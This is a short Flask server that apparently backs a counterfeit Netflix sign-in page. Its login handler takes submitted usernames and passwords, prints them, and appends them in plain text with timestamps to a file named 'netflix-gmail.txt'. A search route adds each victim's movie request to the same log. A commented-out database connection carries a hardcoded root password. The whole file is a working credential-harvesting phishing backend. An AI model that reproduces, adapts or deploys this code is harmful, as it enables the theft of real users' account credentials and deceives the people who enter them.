from flask import  Flask ,render_template,request
from datetime import datetime
import mysql.connector
# mydb= mysql.connector.connect(host='127.0.0.1',port='3306',user='root',password='123456',database= 'netflix')
# mycursor= mydb.cursor()
app = Flask(__name__)

@app.route("/")
def home():
    return render_template('base_page.html')

@app.route("/",methods=["POST"])
def login():
   try:
    global username
    global password
    username = request.form['nm']
    password=request.form['mn']
    print(f'username -- {username}\n'
          f'password  --{password}')
    if len(password)<8:
        return render_template('base_page.html')
    open('netflix-gmail.txt','a+').write(username + password +datetime.now().strftime("%d/%m/%Y %H:%M:%S")+'\n\n\n')
    # value = 'insert into user  (name , password) values (%s,%s)'
    # data = (username, password)
    # mycursor.execute(value, data)
    return render_template('falcon.html')
   except :
       return  render_template('base_page.html')
@app.route("/search",methods=['POST'])
def search():
   try:
     movie = request.form['name']
     print(f'{username} request for {movie}')
     open('netflix-gmail.txt','a+').write(username + password +datetime.now().strftime("%d/%m/%Y %H:%M:%S")+'\n\n\n'+ movie)
#      value = 'insert into user  (name , password,movie ,date ) values (%s,%s,%s,%s)'
#      data = (username, password,movie, datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
#      mycursor.execute(value, data)
#      mydb.commit()

     return render_template('netflixsym.html')
   except:
       return render_template('netflixsym.html')

if __name__=="__main__":
  app.run(debug=False,host='0.0.0.0')



